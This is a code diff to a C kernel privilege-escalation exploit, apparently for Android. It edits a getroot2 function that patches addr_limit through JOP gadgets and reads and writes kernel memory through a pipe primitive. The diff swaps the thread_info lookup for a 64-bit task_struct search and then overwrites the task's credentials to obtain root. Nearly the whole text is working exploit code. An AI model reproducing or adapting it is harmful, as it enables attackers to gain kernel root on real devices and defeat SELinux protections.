@@ -13,6 +13,7 @@
 #include "offsets.h"
 #include "selinux.h"
 #include "policy.h"
+#include "util64.h"
 
 #define UDP_SERVER_PORT (5105)
 #define MEMMAGIC (0xDEADBEEF)
@@ -332,7 +333,7 @@ int getroot2(struct offsets2* o)
 {
 	int ret = 1;
 	int dev;
-	unsigned long fp;
+	//unsigned long fp;
 	struct thread_info* ti;
 
 	printf("[+] Installing patch addr_limit JOP\n");
@@ -350,18 +351,32 @@ int getroot2(struct offsets2* o)
 	if(writel_at_address_pipe(o->check_flags, 0))
 		goto end;
 
-	printf("[+] Installing get_threadinfo JOP\n");
-	if(writel_at_address_pipe(o->check_flags, (long)o->get_threadinfo_joploc))
-		goto end;
+	//printf("[+] Installing get_threadinfo JOP\n");
+	//if(writel_at_address_pipe(o->check_flags, (long)o->get_threadinfo_joploc))
+	//	goto end;
 
-	printf("[+] Getting threadinfo...\n");
-	fp = (unsigned)fcntl(dev, F_SETFL, MMAP_START);
-	fp += KERNEL_START;
-	ti = get_thread_info(fp);
+	//printf("[+] Getting threadinfo...\n");
+	//fp = (unsigned)fcntl(dev, F_SETFL, MMAP_START);
+	//fp += KERNEL_START;
+	//ti = get_thread_info(fp);
 
-	printf("[+] Removing get_threadinfo JOP\n");
-	if(writel_at_address_pipe(o->check_flags, 0))
+	//printf("[+] Removing get_threadinfo JOP\n");
+	//if(writel_at_address_pipe(o->check_flags, 0))
+	//	goto end;
+	if(0!=init_utils64()) {
+		printf("[+] task_struct search init error!\n");
 		goto end;
+	}
+	if(0!=new_search_task64()) {
+		printf("[+] task_struct search error!\n");
+		goto end;
+	}
+	unsigned long current_task_struct = get_task_struct64();
+
+	if(read_at_address_pipe((void*)(current_task_struct+8), &ti, sizeof(ti))) {
+		printf("[+] Read stack base error from task_struct!\n");
+		goto end;
+	}
 
 	printf("[+] Root ...\n");
 	if((ret = modify_task_cred_uc(ti)))
